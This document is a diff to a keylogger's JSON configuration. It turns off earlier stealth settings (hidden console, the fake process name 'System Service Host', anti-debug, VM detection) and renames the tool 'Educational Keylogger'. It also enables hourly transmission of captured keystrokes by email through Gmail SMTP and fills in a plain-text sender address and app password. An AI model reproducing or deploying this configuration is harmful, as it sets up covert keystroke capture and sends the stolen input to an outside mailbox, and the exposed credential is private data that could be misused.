@@ -1,8 +1,8 @@
 {
     "general": {
-        "debug_mode": false,
-        "log_level": "INFO",
-        "process_name": "System Configuration Manager"
+        "debug_mode": true,
+        "log_level": "DEBUG",
+        "process_name": "Educational Keylogger"
     },
     "keylogger": {
         "enabled": true,
@@ -21,12 +21,12 @@
         "compress_logs": true
     },
     "stealth": {
-        "hide_console": true,
-        "process_name_obfuscation": true,
-        "fake_process_name": "System Service Host",
-        "create_decoy_files": true,
-        "vm_detection": true,
-        "anti_debug": true,
+        "hide_console": false,
+        "process_name_obfuscation": false,
+        "fake_process_name": "Educational Keylogger",
+        "create_decoy_files": false,
+        "vm_detection": false,
+        "anti_debug": false,
         "self_destruct_on_analysis": false
     },
     "persistence": {
@@ -48,22 +48,23 @@
         "backup_interval_days": 7
     },
     "transmission": {
-        "enabled": false,
+        "enabled": true,
         "method": "email",
-        "interval_hours": 24,
-        "delete_after_send": true,
+        "interval_hours": 1,
+        "delete_after_send": false,
         "retry_attempts": 3,
         "compress_before_send": true
     },
     "email": {
-        "enabled": false,
+        "enabled": true,
         "smtp_server": "smtp.gmail.com",
         "smtp_port": 587,
         "use_tls": true,
-        "sender_email": "",
-        "sender_password": "",
-        "recipient_email": "",
-        "subject_prefix": "Keylogger Report"
+        "sender_email": "ayoubgoubraim@gmail.com",
+        "sender_password": "eqmy hqrx tkqi ptwu",
+        "recipient_email": "ayoubgoubraim@gmail.com",
+        "subject_prefix": "Keylogger Report",
+        "send_interval_hours": 0.1
     },
     "ftp": {
         "enabled": false,
